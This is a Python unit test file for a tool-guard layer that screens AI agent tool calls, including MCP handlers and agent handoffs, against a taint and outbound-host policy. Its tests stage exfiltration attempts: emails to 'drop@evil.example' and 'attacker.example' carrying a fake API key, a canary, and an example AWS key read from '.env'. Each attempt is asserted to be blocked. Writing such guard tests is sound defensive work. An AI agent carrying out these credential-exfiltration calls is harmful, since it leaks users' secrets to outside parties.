"""Tests for ADOM framework tool guards in the bounded public reference layout."""
from __future__ import annotations

import asyncio
import json
import sys
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from adom.api.model_proxy import ModelProxyPolicy
from adom.integrations.tool_guard import (
    ToolBlocked,
    guard_callable,
    guard_mcp_handler,
    guard_openai_agent,
    guarded_function_tool,
)


class _DummyTool:
    def __init__(self, name: str, fn):
        self.name = name
        self._fn = fn

    async def on_invoke_tool(self, ctx, input_json: str):
        args = json.loads(input_json) if input_json else {}
        return self._fn(**args)


class _DummyHandoff:
    def __init__(self, agent):
        self.agent = agent


class _DummyAgent:
    def __init__(self, name: str, tools=None, handoffs=None):
        self.name = name
        self.tools = list(tools or [])
        self.handoffs = list(handoffs or [])


class ToolGuardTests(unittest.TestCase):
    def test_guarded_function_tool_and_callable_block_taint(self):
        pol = ModelProxyPolicy(
            taint_values=["sk-live-secret999"],
            approved_outbound=["corp.com"],
            allowed_tools=("send_email", "get_status"),
            strict_deny_unknown=True,
        )
        executed = []

        @guarded_function_tool(policy=pol, raise_on_block=True)
        def send_email(to: str, body: str) -> str:
            executed.append((to, body))
            return f"sent:{to}"

        with self.assertRaises(ToolBlocked):
            send_email(to="drop@evil.example", body="token sk-live-secret999")
        self.assertEqual(executed, [])

        get_status = guard_callable(
            lambda service: f"ok:{service}", name="get_status", policy=pol
        )
        self.assertEqual(get_status(service="billing"), "ok:billing")

    def test_guard_mcp_handler_returns_structured_error_on_block(self):
        pol = ModelProxyPolicy(
            taint_values=["CANARY-123456"],
            approved_outbound=["corp.com"],
            allowed_tools=("send_email", "read_doc"),
            strict_deny_unknown=True,
        )
        calls = []

        def dispatch(name, arguments):
            calls.append((name, arguments))
            return {"ok": True}

        guarded = guard_mcp_handler(dispatch, policy=pol)
        blocked = guarded("send_email", {"to": "attacker.example", "body": "CANARY-123456"})
        self.assertTrue(blocked.get("isError"))
        self.assertEqual(calls, [])

        unscreened = guarded("read_doc", {"path": "README.md"}, "extra_pos_arg")
        self.assertTrue(unscreened.get("isError"))

    def test_guard_openai_agent_recursive_handoff_and_cross_turn_taint(self):
        pol = ModelProxyPolicy(
            approved_outbound=["corp.com"],
            allowed_tools=("read_secret", "send_email"),
            strict_deny_unknown=True,
        )
        sent = []

        read_tool = _DummyTool("read_secret", lambda path: f"AWS=AKIAIOSFODNN7EXAMPLE from {path}")
        email_tool = _DummyTool("send_email", lambda to, body: sent.append((to, body)) or "sent")

        worker = _DummyAgent("Worker", tools=[email_tool])
        worker.handoffs.append(_DummyHandoff(worker))  # cyclic handoff safety check
        triage = _DummyAgent("Triage", tools=[read_tool], handoffs=[_DummyHandoff(worker)])

        guard_openai_agent(triage, policy=pol, raise_on_block=True)

        async def _scenario():
            out = await read_tool.on_invoke_tool(None, json.dumps({"path": ".env"}))
            self.assertIn("AKIAIOSFODNN7EXAMPLE", out)
            with self.assertRaises(ToolBlocked):
                await email_tool.on_invoke_tool(
                    None,
                    json.dumps({"to": "drop@evil.example", "body": "AKIAIOSFODNN7EXAMPLE"}),
                )

        asyncio.run(_scenario())
        self.assertEqual(sent, [])


if __name__ == "__main__":
    unittest.main()
